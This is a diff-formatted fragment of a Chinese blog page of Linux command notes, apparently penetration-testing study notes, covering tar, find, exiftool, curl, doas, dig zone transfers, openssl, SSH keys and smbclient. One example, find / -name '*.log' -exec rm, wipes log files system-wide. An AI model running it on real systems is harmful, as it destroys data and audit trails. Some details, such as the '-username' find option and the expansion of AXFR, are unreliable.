显示主机名，而非版本信息</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><h3 id="常用参数-4"><a href="#常用参数-4" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-x</td>
+<td>提取归档文件中的内容。用于将归档文件解压缩并提取其中的文件。</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>指定归档文件的名称。此选项后面必须跟上文件路径或文件名，用于告诉命令操作的文件。</td>
+</tr>
+<tr>
+<td>-v</td>
+<td>显示详细信息。在解压缩或归档时，使用此选项将列出正在处理的文件名，帮助用户追踪过程。</td>
+</tr>
+<tr>
+<td>-z</td>
+<td>如果归档是 gzip 压缩的，则解压。用于解压缩 <code>.gz</code> 格式的文件。</td>
+</tr>
+<tr>
+<td>-j</td>
+<td>如果归档是 bzip2 压缩的，则解压。用于解压缩 <code>.bz2</code> 格式的文件。</td>
+</tr>
+<tr>
+<td>-J</td>
+<td>如果归档是 xz 压缩的，则解压。用于解压缩 <code>.xz</code> 格式的文件。</td>
+</tr>
+<tr>
+<td>-c</td>
+<td>将输出发送到标准输出，而不是直接写入文件。常用于将归档内容输出到屏幕或另一个命令。</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>测试归档文件是否完整，检查归档中的文件是否可以正常解压缩。</td>
+</tr>
+<tr>
+<td>-u</td>
+<td>更新归档文件。仅将比归档中现有文件更新的文件添加到归档。</td>
+</tr>
+<tr>
+<td>-p</td>
+<td>保留文件的原始权限和时间戳。在解压时不更改文件的时间戳和权限。</td>
+</tr>
+</tbody></table>
+<h3 id="使用示例-3"><a href="#使用示例-3" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建压缩包</span></span><br><span class="line">tar czvf archive.tar.gz <span class="built_in">dir</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压到指定目录</span></span><br><span class="line">tar xzvf archive.tar.gz -C /target/dir</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>find一个文件 后面可以跟上 -exec指定每找到一个就执行的命令 比如 -exec whami ;  后面要加上反斜杠和封号 告诉find不用解析后面的内容了（需要做的命令就这些）</p>
+<h3 id="常用参数和示例"><a href="#常用参数和示例" class="headerlink" title="常用参数和示例"></a>常用参数和示例</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-username</code></td>
+<td>指定用户名</td>
+<td><code>find /home -username user1</code></td>
+</tr>
+<tr>
+<td><code>-group</code></td>
+<td>指定组</td>
+<td><code>find /home -group admin</code></td>
+</tr>
+<tr>
+<td><code>-type</code></td>
+<td>指定要找的文件类型</td>
+<td><code>find / -type f</code>（查找普通文件）<br><code>find / -type d</code>（查找目录）</td>
+</tr>
+<tr>
+<td><code>-name</code></td>
+<td>按文件名查找</td>
+<td><code>find /home -name &quot;*.txt&quot;</code></td>
+</tr>
+<tr>
+<td><code>-size</code></td>
+<td>按文件大小查找</td>
+<td><code>find / -size +10M</code>（查找大于10MB的文件）</td>
+</tr>
+<tr>
+<td><code>-mtime</code></td>
+<td>按修改时间查找</td>
+<td><code>find / -mtime -7</code>（查找最近7天内修改的文件）</td>
+</tr>
+<tr>
+<td><code>-exec</code></td>
+<td>对找到的文件执行命令</td>
+<td><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code></td>
+</tr>
+<tr>
+<td><code>-perm</code></td>
+<td>按权限查找</td>
+<td><code>find / -perm 644</code></td>
+</tr>
+<tr>
+<td><code>-user</code></td>
+<td>按文件所有者查找</td>
+<td><code>find / -user user1</code></td>
+</tr>
+<tr>
+<td><code>-maxdepth</code></td>
+<td>设置查找的最大深度</td>
+<td><code>find / -maxdepth 2</code></td>
+</tr>
+</tbody></table>
+<h2 id="–break-system-packages"><a href="#–break-system-packages" class="headerlink" title="–break-system-packages"></a>–break-system-packages</h2><p>新的kali和ubuntu中的pip指令直接安装会报错，pip3 install 后面加上这个指令才能安装（忽略风险）推荐使用docker安装</p>
+<h2 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h2><p><code>exiftool</code> 是一个功能强大的命令行工具，用于读取、修改和删除文件的元数据（metadata）。它支持多种文件格式，包括图片、视频、音频、PDF 等，常用于处理 EXIF、IPTC、XMP 等类型的元信息。</p>
+<h3 id="常用参数-5"><a href="#常用参数-5" class="headerlink" title="常用参数"></a>常用参数</h3><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-common</code></td>
+<td>显示常见的元数据信息</td>
+<td><code>exiftool -common image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-all</code></td>
+<td>显示所有元数据</td>
+<td><code>exiftool -all image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-overwrite_original</code></td>
+<td>修改文件时不生成备份</td>
+<td><code>exiftool -overwrite_original -Artist=&quot;John Doe&quot; image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-Author</code></td>
+<td>设置作者信息</td>
+<td><code>exiftool -Author=&quot;John Doe&quot; image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-DateTimeOriginal</code></td>
+<td>修改拍摄时间</td>
+<td><code>exiftool -DateTimeOriginal=&quot;2024:01:30 12:00:00&quot; image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-GPSLatitude</code> &amp; <code>-GPSLongitude</code></td>
+<td>设置GPS坐标</td>
+<td><code>exiftool -GPSLatitude=40.7128 -GPSLongitude=-74.0060 image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-r</code></td>
+<td>递归处理目录</td>
+<td><code>exiftool -r -all /path/to/images</code></td>
+</tr>
+<tr>
+<td><code>-d</code></td>
+<td>格式化时间输出</td>
+<td><code>exiftool -d &quot;%Y-%m-%d %H:%M:%S&quot; image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-delete_original</code></td>
+<td>删除备份文件</td>
+<td><code>exiftool -delete_original image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-tagsFromFile</code></td>
+<td>从另一个文件复制元数据</td>
+<td><code>exiftool -tagsFromFile source.jpg target.jpg</code></td>
+</tr>
+<tr>
+<td><code>-fast</code></td>
+<td>加快处理速度，但可能略微降低准确性</td>
+<td><code>exiftool -fast image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-b</code></td>
+<td>以二进制格式提取数据</td>
+<td><code>exiftool -b -ThumbnailImage image.jpg &gt; thumb.jpg</code></td>
+</tr>
+<tr>
+<td><code>-P</code></td>
+<td>保留原始文件修改时间</td>
+<td><code>exiftool -P -Artist=&quot;Jane Doe&quot; image.jpg</code></td>
+</tr>
+<tr>
+<td><code>-X</code></td>
+<td>以XML格式导出元数据</td>
+<td><code>exiftool -X image.jpg &gt; metadata.xml</code></td>
+</tr>
+<tr>
+<td><code>-csv</code></td>
+<td>以CSV格式导出元数据</td>
+<td><code>exiftool -csv image.jpg &gt; metadata.csv</code></td>
+</tr>
+</tbody></table>
+<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><code>curl</code> 是一个非常强大的命令行工具，用于向服务器发送请求并接收响应。它支持多种协议（如 HTTP、HTTPS、FTP 等），常用于下载文件、测试接口、提交数据等操作。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-o</code></td>
+<td>保存输出到指定文件</td>
+<td><code>curl -o output.html https://example.com</code></td>
+</tr>
+<tr>
+<td><code>-O</code></td>
+<td>以远程文件名保存</td>
+<td><code>curl -O https://example.com/file.zip</code></td>
+</tr>
+<tr>
+<td><code>-L</code></td>
+<td>跟随重定向</td>
+<td><code>curl -L https://example.com</code></td>
+</tr>
+<tr>
+<td><code>-I</code></td>
+<td>仅获取 HTTP 头信息</td>
+<td><code>curl -I https://example.com</code></td>
+</tr>
+<tr>
+<td><code>-X</code></td>
+<td>指定 HTTP 方法</td>
+<td><code>curl -X POST https://example.com/api</code></td>
+</tr>
+<tr>
+<td><code>-H</code></td>
+<td>添加 HTTP 头</td>
+<td><code>curl -H &quot;Authorization: Bearer TOKEN&quot; https://api.example.com</code></td>
+</tr>
+<tr>
+<td><code>-d</code></td>
+<td>发送 POST 数据</td>
+<td><code>curl -d &quot;name=John&amp;age=30&quot; -X POST https://example.com/form</code></td>
+</tr>
+<tr>
+<td><code>-F</code></td>
+<td>上传文件</td>
+<td><code>curl -F &quot;file=@image.jpg&quot; https://example.com/upload</code></td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>认证（用户名:密码）</td>
+<td><code>curl -u user:pass https://example.com/login</code></td>
+</tr>
+<tr>
+<td><code>-k</code></td>
+<td>跳过 SSL 证书验证</td>
+<td><code>curl -k https://self-signed.example.com</code></td>
+</tr>
+</tbody></table>
+<p>-X 指定访问方式 POST GET PUT<br>–data 指定具体参数</p>
+<h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>它旨在提供简洁的命令行指令使用示例和说明，帮助用户快速了解命令的基本用法。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">tldr</span><span class="meta"> [命令名称]</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="gocr"><a href="#gocr" class="headerlink" title="gocr"></a>gocr</h2><p><code>gocr</code> 是一个在 Linux 等系统中用于光学字符识别（OCR）的工具，它可以将图像中的文字提取并转换为可编辑的文本格式</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gocr image.jpg</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="doas"><a href="#doas" class="headerlink" title="doas"></a>doas</h2><p><code>doas</code>是一个用于在类 Unix 系统中以其他用户身份（通常是超级用户<code>root</code>）执行命令的工具，类似于<code>su</code>和<code>sudo</code>。以下是关于<code>doas</code>的基本信息和常用参数：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-n：不询问密码执行命令。但这需要在 doas 的配置文件中进行相应设置，允许特定用户或用户组在不输入密码的情况下执行某些命令。例如，在配置允许的情况下，doas -n some_command 可以直接执行命令而无需输入密码。</span></span><br><span class="line"><span class="deletion">-v：显示 doas 的版本信息。</span></span><br></pre></td></tr></table></figure></div>
+<h3 id="使用示例-4"><a href="#使用示例-4" class="headerlink" title="使用示例"></a>使用示例</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以 root 身份执行命令（类似 sudo）</span></span><br><span class="line">doas <span class="keyword">ls</span> <span class="string">/root</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 以特定用户身份执行命令</span></span><br><span class="line">doas -u user <span class="keyword">ls</span> <span class="string">/home/user</span></span><br><span class="line"><span class="params">------------------------------</span></span><br><span class="line">（下面是配置文件中的内容）</span><br><span class="line"><span class="comment"># 允许用户执行所有命令（/etc/doas.conf）</span></span><br><span class="line">permit username</span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许用户以 root 身份执行指定命令</span></span><br><span class="line">permit username as root cmd <span class="string">/sbin/shutdown</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 允许用户无需密码执行某些命令</span></span><br><span class="line">permit nopass username as root cmd <span class="string">/sbin/reboot</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p><code>dig</code>（Domain Information Groper）是一个用于查询 DNS（Domain Name System）信息的强大工具，在 Linux 系统中非常常用</p>
+<p>在 dig 命令中，AXFR 是一种查询类型，用于请求 DNS 区域传输（ Authoritative Xerox File Replication）。它用于从主 DNS 服务器获取整个 DNS 区域的所有记录，通常用于备份 DNS 记录或在主 &#x2F; 辅助 DNS 服务器之间同步数据。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @<span class="tag">&lt;<span class="name">DNS服务器</span>&gt;</span> <span class="tag">&lt;<span class="name">域名</span>&gt;</span> AXFR</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="使用示例-5"><a href="#使用示例-5" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域名的 A 记录</span></span><br><span class="line"><span class="keyword">dig </span>example.com A</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域名的 MX 记录（邮件服务器）</span></span><br><span class="line"><span class="keyword">dig </span>example.com MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用指定的 DNS 服务器（如 8.8.8.8）进行查询</span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取简短的查询结果</span></span><br><span class="line"><span class="keyword">dig </span>example.com +<span class="keyword">short</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment"># 追踪 DNS 解析过程</span></span><br><span class="line"><span class="keyword">dig </span>example.com +trace</span><br><span class="line"></span><br><span class="line"><span class="comment">#从指定dns服务器上查询，用@符号 </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#-x </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#精简输出 +short</span></span><br><span class="line"> <span class="keyword">dig </span>+<span class="keyword">short </span>abc.filterinto.com</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="resolv-conf"><a href="#resolv-conf" class="headerlink" title="resolv.conf"></a>resolv.conf</h2><p><code>resolv.conf</code> 是一个在类 Unix 系统（如 Linux、Unix、macOS 等）中非常重要的配置文件，它主要用于配置系统的 DNS（域名系统）解析相关信息。</p>
+<ul>
+<li>在大多数 Linux 系统中，<code>resolv.conf</code> 通常位于 <code>/etc/resolv.conf</code>。</li>
+</ul>
+<h2 id="etc-bind"><a href="#etc-bind" class="headerlink" title="&#x2F;etc&#x2F;bind"></a>&#x2F;etc&#x2F;bind</h2><p><code>/etc/bind</code> 是在 BIND（Berkeley Internet Name Domain）DNS 服务器软件的常见配置目录。BIND 是一个广泛使用的开源 DNS 服务器软件，用于实现域名解析服务。</p>
+<h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p><code>tr</code> 命令主要用于字符的替换、删除和压缩，它从标准输入读取数据，并将处理结果输出到标准输出。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> <span class="selector-attr">[选项]</span> SET1 <span class="selector-attr">[SET2]</span></span><br></pre></td></tr></table></figure></div>
+<ul>
+<li><code>-c</code>：使用 <code>SET1</code> 的补集。即操作除 <code>SET1</code> 中字符以外的所有字符。</li>
+<li><code>-d</code>：删除 <code>SET1</code> 中的字符，而不是替换它们。</li>
+<li><code>-s</code>：将连续重复的字符压缩为一个字符。</li>
+</ul>
+<p>通常只能用来单个字符</p>
+<h3 id="使用示例-6"><a href="#使用示例-6" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将小写字母转换为大写</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;a-z&#x27;</span> <span class="string">&#x27;A-Z&#x27;</span></span><br><span class="line"><span class="comment"># 输出: HELLO WORLD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除数字</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;abc123xyz&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;0-9&#x27;</span></span><br><span class="line"><span class="comment"># 输出: abcxyz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩连续的空格为单个空格</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello     world&quot;</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment"># 输出: hello world</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 只保留字母，删除所有非字母字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a1b2c3d4&quot;</span> | <span class="built_in">tr</span> -<span class="built_in">cd</span> <span class="string">&#x27;a-zA-Z&#x27;</span></span><br><span class="line"><span class="comment"># 输出: abcd</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><p><code>sed</code>（Stream Editor）是一个强大的流编辑器，它可以对文本流进行各种操作，包括查找、替换、删除、插入等。<code>sed</code> 主要用于对文件或标准输入进行逐行处理，并将处理结果输出。</p>
+<ul>
+<li><code>s/模式/替换内容/g</code>：这是最常用的命令，用于进行字符串替换。<ul>
+<li><code>s</code> 表示替换操作。</li>
+<li><code>模式</code> 是要查找和替换的内容。</li>
+<li><code>替换内容</code> 是替换后的内容。</li>
+<li><code>g</code> 表示全局替换，即对每一行中出现的所有匹配模式进行替换。如果不使用 <code>g</code>，则只替换每行中的第一个匹配项。</li>
+</ul>
+</li>
+<li><code>d</code>：删除匹配模式的行。</li>
+<li><code>p</code>：打印匹配模式的行。</li>
+</ul>
+<h3 id="使用示例-7"><a href="#使用示例-7" class="headerlink" title="使用示例"></a>使用示例</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 替换字符串</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | sed <span class="string">&#x27;s/world/universe/&#x27;</span></span><br><span class="line"><span class="comment"># 输出: hello universe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 全局替换</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;apple banana apple&quot;</span> | sed <span class="string">&#x27;s/apple/orange/g&#x27;</span></span><br><span class="line"><span class="comment"># 输出: orange banana orange</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除包含特定字符串的行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line1\nline2\nline3&quot;</span> | sed <span class="string">&#x27;/line2/d&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># line1</span></span><br><span class="line"><span class="comment"># line3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印匹配行</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;foo\nbar\nbaz&quot;</span> | sed -n <span class="string">&#x27;/ba/p&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># bar</span></span><br><span class="line"><span class="comment"># baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅替换第一行匹配项</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;apple\napple\napple&quot;</span> | sed <span class="string">&#x27;1s/apple/orange/&#x27;</span></span><br><span class="line"><span class="comment"># 输出:</span></span><br><span class="line"><span class="comment"># orange</span></span><br><span class="line"><span class="comment"># apple</span></span><br><span class="line"><span class="comment"># apple</span></span><br></pre></td></tr></table></figure></div>
+<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>在 Linux 系统中，<code>alias</code> 是一个用于创建命令快捷方式的功能。通过 <code>alias</code>，你可以将复杂或常用的命令定义为简短的名称，从而提高效率并减少重复输入。</p>
+<h2 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># AES 解密</span><br><span class="line">openssl enc -d -aes<span class="number">-256</span>-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># DES 解密</span><br><span class="line">openssl enc -d -des-ede3-cbc -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -<span class="keyword">out</span> decrypted.txt -k <span class="keyword">password</span></span><br><span class="line"></span><br><span class="line"># RSA 解密</span><br><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> <span class="keyword">encrypted</span>.txt -inkey private_key.pem -<span class="keyword">out</span> decrypted.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>参数解释：<br>openssl enc: 这个命令用于对称加密或解密，enc 表示使用加密算法。</p>
+<p>-d: 解密模式，表示对加密文件进行解密操作。<br>-aes-256-cbc: 指定加密算法为 AES，使用 256 位密钥和 CBC 模式。<br>-des-ede3-cbc: 指定加密算法为 DES，使用 3 重加密 (EDE3) 和 CBC 模式。<br>-in encrypted.txt: 输入的加密文件。<br>-out decrypted.txt: 解密后的输出文件。<br>-k password: 密钥，通常是密码形式的字符串，用于解密过程。<br>openssl rsautl: 用于进行 RSA 加密、解密或签名验证。</p>
+<p>-decrypt: 解密模式，用于对使用 RSA 加密的文件进行解密。<br>-in encrypted.txt: 输入的加密文件。<br>-inkey private_key.pem: 指定私钥文件，私钥用于解密操作。<br>-out decrypted.txt: 解密后的输出文件。</p>
+<h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><ul>
+<li>将标准输入传递给其他命令。例如，echo “file1 file2 file3” | xargs ls，这条命令先通过echo输出文件名列表，然后xargs将这些文件名作为参数传递给ls命令，实现列出这些文件的信息。</li>
+<li>-n选项可指定每次传递给命令的参数数量。例如echo {1..10} | xargs -n 3 echo，会将输入的数字每 3 个一组传递给echo命令，实现分组输出</li>
+</ul>
+<h2 id="id-rsa"><a href="#id-rsa" class="headerlink" title="id_rsa"></a>id_rsa</h2><p>这个文件通常存的是ssh的私钥 可以用ssh -i id_rsa来进行ssh 登录 但是这个文件的权限要先chmod 600<br>公钥文件权限是644</p>
+<h2 id="ssh-authorized-keys"><a href="#ssh-authorized-keys" class="headerlink" title="~&#x2F;.ssh&#x2F;authorized_keys"></a>~&#x2F;.ssh&#x2F;authorized_keys</h2><p><code>~/.ssh/authorized_keys</code> 是一个 <strong>公钥认证</strong> 文件，它存储的是 <strong>可以用于无密码 SSH 登录该账户的公钥</strong>。</p>
+<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a><strong>作用</strong></h3><p>当你尝试通过 SSH 登录到一个账户时（比如 <code>ssh user@host</code>），SSH 服务器会检查 <code>~/.ssh/authorized_keys</code> 文件，如果其中包含与你的私钥匹配的公钥，就允许你登录，而 <strong>无需输入密码</strong>。<br><code>~/.ssh/authorized_keys</code> <strong>支持在公钥前面指定 <code>command=</code> 选项</strong>，这样 <strong>每次有人使用该公钥登录时，就会自动执行指定的命令</strong>，而不会启动普通的 shell。</p>
+<h3 id="用私钥生成公钥"><a href="#用私钥生成公钥" class="headerlink" title="用私钥生成公钥"></a>用私钥生成公钥</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -<span class="attribute">y</span> -f id_rsa &gt; authorized_keys</span><br></pre></td></tr></table></figure></div>
+<p>📌 <strong>说明</strong>：</p>
+<ul>
+<li><code>-y</code>：从私钥中提取公钥</li>
+<li><code>-f id_rsa</code>：指定私钥文件</li>
+<li><code>&gt; authorized_keys</code>：输出公钥到文件</li>
+<li></li>
+</ul>
+<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="Samba-简介"><a href="#Samba-简介" class="headerlink" title="Samba 简介"></a>Samba 简介</h3><p>在 Linux 中，SMB（Server Message Block）服务是一种网络文件共享协议，通常用于在网络中共享文件、打印机和其他资源。<br>SMB 最初由 Microsoft 开发，并且是 Windows 操作系统中广泛使用的文件共享协议。<br>在 Linux 系统中，SMB 服务通常由 Samba 软件提供支持。</p>
+<h3 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h3><p>文件共享：允许在不同操作系统之间共享文件和目录。<br>打印机共享：允许在网络中共享打印机。<br>网络浏览：允许计算机查看和浏览网络中的共享资源。</p>
+<h3 id="主要配置文件"><a href="#主要配置文件" class="headerlink" title="主要配置文件"></a>主要配置文件</h3><p>&#x2F;etc&#x2F;samba&#x2F;smb.conf：Samba 的主要配置文件，管理员在此设置共享目录、访问权限等。<br>smbclient：命令行工具，用于连接和访问 SMB 共享资源。</p>
+<h3 id="smbclient-参数和使用"><a href="#smbclient-参数和使用" class="headerlink" title="smbclient 参数和使用"></a>smbclient 参数和使用</h3><p>-L：列出共享资源的信息。</p>
+<p>-U：指定连接时使用的用户名。</p>
+<p>&#x2F;&#x2F;：指定共享资源的路径，通常以 &#x2F;&#x2F;&lt;服务器地址&gt;&#x2F;&lt;共享名称&gt; 的格式指定。</p>
+<p>示例：访问 server 上的共享目录 share：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //<span class="keyword">server</span>/<span class="keyword">share</span> -U username</span><br></pre></td></tr></table></figure></div>
